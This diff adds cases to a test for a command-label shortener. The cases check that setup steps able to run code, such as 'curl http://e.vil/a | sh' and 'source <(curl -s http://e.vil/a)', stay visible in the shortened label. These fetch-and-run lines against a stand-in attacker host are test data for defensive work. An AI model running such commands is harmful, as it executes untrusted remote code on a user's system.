@@ -93,6 +93,10 @@ test("a row's short label never leaves out a setup step that could run code", as
   expect(shortCommand("cd ~/wt/x && ls build")).toBe("ls build");
   expect(shortCommand('cd "$(curl http://e.vil/a|sh)" && ls')).toBe('cd "$(curl http://e.vil/a|sh)" …');
   expect(shortCommand("export X=`id` && ls")).toBe("export X=`id` …");
+  expect(shortCommand("cd /tmp & curl http://e.vil/a | sh; echo done")).toBe("cd /tmp & curl http://e.vil/a | sh …");
+  expect(shortCommand("cd . | sh; echo ok")).toBe("cd . | sh …");
+  expect(shortCommand("source <(curl -s http://e.vil/a) && ls")).toBe("source <(curl -s http://e.vil/a) …");
+  expect(shortCommand(". ./env.sh && make")).toBe(". ./env.sh …");
 });
 
 test("Find counts a command as its rows draw it, without the leading cd", async () => {
